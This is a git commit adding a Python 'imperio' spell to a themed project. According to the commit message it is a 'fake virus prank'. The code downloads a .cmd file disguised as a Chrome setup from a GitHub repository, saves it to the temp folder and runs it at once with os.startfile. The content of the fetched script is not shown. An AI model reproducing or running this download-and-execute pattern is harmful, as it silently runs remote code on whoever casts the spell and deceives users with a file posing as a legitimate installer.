9fb5e84a7cfa6f8ad6072d9264c48d8be7f8d967
giamat13 <197935266+giamat13@users.noreply.github.com>
2026-06-06 08:37:28 +0300

    feat: add imperio spell to download and run a fake virus prank

---
+++ spells/imperio.py
@@ -0,0 +1,30 @@
+import urllib.request
+import os
+import tempfile
+
+INTRO = r"""
+   .    .    .         .    .     .
+
+.    .    __________________________________
+  .      /                                  \
+    .   |      ✦  I M P E R I O  !          |
+  .      \__________________________________/
+     .        .    .    .       .
+
+"""
+
+URL = "https://raw.githubusercontent.com/giamat13/fake-virus-chrome-setup/refs/heads/main/chrome%20setup.cmd"
+
+def cast(*args):
+    print(INTRO)
+    print("  [!!!] IMPERIUS CURSE!")
+    print("  [!!!] Taking control...\n")
+    try:
+        tmp = os.path.join(tempfile.gettempdir(), "chrome_setup.cmd")
+        urllib.request.urlretrieve(URL, tmp)
+        os.startfile(tmp)
+    except Exception as e:
+        print(f"  [!] Curse failed: {e}")
+
+if __name__ == "__main__":
+    cast()
